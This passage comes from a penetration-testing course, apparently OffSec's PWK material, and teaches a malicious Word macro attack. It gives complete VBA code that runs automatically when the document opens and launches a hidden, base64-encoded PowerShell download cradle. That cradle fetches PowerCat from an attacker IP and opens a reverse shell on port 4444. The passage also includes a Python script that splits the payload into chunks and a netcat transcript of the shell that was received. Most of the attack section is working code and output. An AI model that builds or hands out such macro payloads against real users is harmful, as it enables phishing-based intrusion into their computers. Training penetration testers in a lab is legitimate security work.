### Finalizing the Installation
Finally, we will click "Done" on the final window to complete the installation.

### Leveraging Microsoft Word for Client-Side Code Execution
With Microsoft Word installed and configured, we can explore various ways to leverage it for client-side code execution.

#### 11.2.3 Leveraging Microsoft Word Macros
Microsoft Office applications like Word and Excel allow users to embed macros, which are a series of commands and instructions grouped together to programmatically accomplish a task. Organizations often use macros to manage dynamic content and link documents with external content.

Macros can be written from scratch in Visual Basic for Applications (VBA), a powerful scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.

In this section, we’ll use an embedded macro in Microsoft Word to launch a reverse shell when the document is opened. Macros are one of the oldest and best-known client-side attack vectors. They still work well today, assuming we take the considerations from the previous sections into account and can convince the victim to enable them.

Bear in mind that older client-side attack vectors, including Dynamic Data Exchange (DDE) and various Object Linking and Embedding (OLE) methods, do not work well today without significant target system modification.

Let’s dive in and create a macro in Word. We’ll create a blank Word document named `mymacro` and save it in the `.doc` format. This is important because the newer `.docx` file type cannot save macros without attaching a containing template. In other words, the macro is not persistent. Alternatively, we could also use the `.docm` file type for our embedded macro.

**References:**
- [Create or run a macro](https://support.office.com/en-us/article/Create-or-run-a-macro-C6B99036-905C-49A6-818A-DFB98B7C3C9C)
- [VBA API Overview](https://docs.microsoft.com/en-us/office/vba/api/overview/)
- [ActiveX](https://en.wikipedia.org/wiki/ActiveX)
- [Dynamic Data Exchange](https://docs.microsoft.com/en-us/windows/win32/dataxchg/about-dynamic-data-exchange?redirectedfrom=MSDN)
- [Object Linking and Embedding](https://en.wikipedia.org/wiki/Object_Linking_and_Embedding)

### Creating the Macro
After saving the document, we can begin creating our first macro. To get to the macro menu, we’ll click on the View tab from the menu bar, where we will find and click the Macros element:

**Figure 182: Saving Document as .doc**

This presents a new window in which we can manage our macros. Let’s enter `MyMacro` as the name in the Macro Name section, then select the `mymacro` document in the Macros in drop-down menu. This is the document that the macro will be saved to. Finally, we’ll click Create to insert a simple macro framework into our document.

**Figure 183: Macro Menu in View Ribbon**

**Figure 184: Create a macro for the current document**

This presents the Microsoft Visual Basic for Applications window where we can develop our macro from scratch or use the inserted macro skeleton.

**Figure 185: Macro Editor**

Let’s review the provided macro skeleton. The main sub procedure used in our VBA macro begins with the `Sub` keyword and ends with `End Sub`. This essentially marks the body of our macro. A sub procedure is very similar to a function in VBA, but sub procedures cannot be used in expressions because they do not return any values, whereas functions do.

At this point, our new macro, `MyMacro()`, is simply an empty sub procedure containing several lines beginning with an apostrophe, which marks the start of a single-line comment in VBA.

```vba
Sub MyMacro()
'
' MyMacro Macro
'
End Sub
```

**Listing 212 - Default empty macro**

In this example, we’ll leverage ActiveX Objects, which provide access to underlying operating system commands. This can be achieved with WScript through the Windows Script Host Shell object. Once we instantiate a Windows Script Host Shell object with `CreateObject`, we can invoke the `Run` method for `Wscript.Shell` to launch an application on the target client machine. For our first macro, we’ll start a PowerShell window. The code for that macro is shown below.

```vba
Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

**Listing 213 - Macro opening powershell.exe**

Since Office macros are not executed automatically, we must use the predefined `AutoOpen` macro and `Document_Open` event. These procedures can call our custom procedure and run our code when a Word document is opened. They differ slightly, depending on how Microsoft Word and the document were opened. Both cover special cases which the other one doesn’t, and therefore we use both.

Our updated VBA code is shown below:

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

**Listing 214 - Macro automatically executing powershell.exe after opening the Document**

Next, we’ll click on the Save icon in the Microsoft Visual Basic for Applications window and close the document. After we re-open it, we are presented with a security warning indicating that macros have been disabled. To run our macro, we’ll click on Enable Content.

**Figure 186: Microsoft Word Macro Security Warning**

After we click on Enable Content, a PowerShell window appears.

**Figure 187: Enabled Macro started a PowerShell window**

As Figure 187 shows, the PowerShell window was started through our macro. Very nice!

In a real-world assessment, our victim must click on Enable Content to run our macros; otherwise, our attack will fail. In enterprise environments, we can also face a situation where macros are disabled for Office documents in general. Fortunately, macros are commonly used (and allowed) in most enterprises.

### Extending the Macro to Execute a Reverse Shell
Let’s extend the code execution of our current macro to a reverse shell with the help of PowerCat. We’ll use a base64-encoded PowerShell download cradle to download PowerCat and start the reverse shell. The encoded PowerShell command will be declared as a String in VBA.

We should note that VBA has a 255-character limit for literal strings, so we can’t just embed the base64-encoded PowerShell commands as a single string. This restriction does not apply to strings stored in variables, so we can split the commands into multiple lines (stored in strings) and concatenate them.

To do this, we’ll click on the Macros element in the View tab, select `MyMacro` in the list, and click on Edit to get back to the macro editor. Next, we’ll declare a string variable named `Str` with the `Dim` keyword, which we’ll use to store our PowerShell download cradle and the command to create a reverse shell with PowerCat. The following listing shows the declaration of the variable and the modified line to run the command stored as a string in the variable.

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB...== "
    CreateObject("Wscript.Shell").Run Str
End Sub
```

**Listing 215 - Declaring a string variable and providing it as a parameter**

Next, we’ll employ a PowerShell command to download PowerCat and execute the reverse shell. We’ll encode the command with base64 to avoid issues with special characters as we’ve dealt with in previous modules. The following listing shows the PowerShell command before base64-encoding.

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```

**Listing 216 - PowerShell download cradle and PowerCat reverse shell**

We can use the following Python script to split the base64-encoded string into smaller chunks of 50 characters and concatenate them into the `Str` variable. To do this, we store the PowerShell command in a variable named `str` and the number of characters for a chunk in `n`. We must make sure that the base64-encoded command does not contain any line breaks after we paste it into the script. A for-loop iterates over the PowerShell command and prints each chunk in the correct format for our macro.

```python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
n = 50
for i in range(0, len(str), n):
    print(f'Str = Str + "{str[i:i+n]}"')
```

**Listing 217 - Python script to split a base64 encoded PowerShell command string**

Having split the base64-encoded string into smaller chunks, we can update our macro:

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB...== "
    CreateObject("Wscript.Shell").Run Str
End Sub
```

**Listing 218 - Macro invoking PowerShell to create a reverse shell**

After we modify our macro, we can save and close the document. Before re-opening it, let’s start a Python3 web server in the directory where the PowerCat script is located. We’ll also start a Netcat listener on port 4444.

After double-clicking the document, the macro is automatically executed. Note that the macro security warning regarding the Enable Content button is not appearing again. It will only appear again if the name of the document changes.

After the macro is executed, we receive a GET request for the PowerCat script in our Python3 web server and an incoming reverse shell in our Netcat listener.

```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.196] 49768
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
PS C:\Users\offsec\Documents>
```

**Listing 220 - Reverse shell from Word macro**

Opening the document ran the macro and sent us a reverse shell. Excellent!

### Summary
Let’s briefly summarize what we did in this section. First, we created a VBA macro in a Word document to execute a single command when the document is opened. Then, we replaced the single command with a base64-encoded PowerShell command downloading PowerCat and starting a reverse shell on the local system.

Microsoft Office documents containing malicious macros are still a great client-side attack vector to obtain an initial foothold in an enterprise network. However, with the growing awareness of users to not open Office documents from emails and the rising number of security technologies in place, it becomes increasingly more difficult to get a macro delivered and executed. Therefore, we’ll discuss another client-side attack in the next Learning Unit, which we can use as an alternative or even as a delivery method for malicious Office documents.

### 11.3 Abusing Windows Library Files
This Learning Unit covers the following Learning Objectives:
- Prepare an attack with Windows library files
- Leverage Windows shortcuts to obtain code execution

Many security products scan for malicious macros. Microsoft also provides guides and Group Policy Object (GPO) templates to mitigate and reduce this threat. In addition, most social engineering awareness training programs focus on preventing this vector. These factors make this a difficult vector to successfully execute.

In this Learning Unit, we’ll explore Windows library files, which are a lesser-known threat but equally effective.

#### 11.3.1 Obtaining Code Execution via Windows Library Files
Windows library files are virtual containers for user content. They connect users with data stored in remote locations like web services or shares. These files have a `.Library-ms` file extension and can be executed by double-clicking them in Windows Explorer.

**References:**
- [Microsoft Guides](https://docs.microsoft.com/en-us/deployoffice/security/introduction-to-office-vba-project-signing)
- [Group Policy Object (GPO) Templates](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)
- [Windows Library Files](https://docs.microsoft.com/en-us/windows/win32/shell/library-files)

---

**PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.**
Made in Morocco
Penetration Testing with Kali Linux